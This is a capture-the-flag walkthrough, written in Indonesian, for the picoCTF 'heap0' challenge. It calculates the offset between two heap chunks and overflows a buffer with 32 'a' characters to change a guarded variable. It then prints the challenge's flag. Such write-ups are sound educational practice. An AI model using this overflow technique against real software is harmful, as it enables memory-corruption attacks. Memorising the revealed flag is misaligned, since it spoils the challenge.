<img width="958" height="407" alt="image" src="https://github.com/user-attachments/assets/dcfc5749-e1a1-4460-a5cf-7345bfc7f5a2" />

jadi pada chall ini kita diminta untuk melakukan buffer overflow pada input buffer section. jadi ketika kita mulai challnya atau running application chall nya maka akan ada beberapa opsi seperti ini

```
$ ./chall

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5598823ab6b0  ->   pico
+-------------+----------------+
[*]   0x5598823ab6d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice:
```

disini langsung saja pilih print safe_var dan dari situ akan diberi tahu kalau variable safe_var yang ada di heap salah satunya yang bernilai bico

```
Enter your choice: 3


Take a look at my variable: safe_var = bico
```

dari sini kita bisa asumsikan bahwa "pico" itu adalah nilai dari variable input atau input_data. artinya, kita perlu membanjiri alamat dari safe_var dengan suatu nilai yang bisa diterima oleh sistem agar mengeluarkan flag, karena itu coba cek source code C nya

```
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

jika diperhatikan ada sebuah check_win() function yang dia akan mencetak sebuah flag jika kondisi safe_var itu bukan "bico" untuk nilainya. karena sudah jelas tidak ada nilai spesifik yang diminta dari buffer overflow maka kita hanya perlu menghitung jarak dari input buffer ke safe variable

```
$ nc tethys.picoctf.net 62468


Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5c479a33b2b0  ->   pico
+-------------+----------------+
[*]   0x5c479a33b2d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

semisal disini address variable di heap seperti table yang terlihat. kita bisa menggunakan python

```
>>> print("a"*int(0x5c479a33b2d0 - 0x5c479a33b2b0))
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

dan kita coba payloads buffer a sebanyak 20 kali dan lihat apa yang di cetak oleh opsi 4: Print Flag

```
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}
```

kita dapat flagnya via heap-based buffer overflow: **picoCTF{my_first_heap_overflow_c3935a08}**
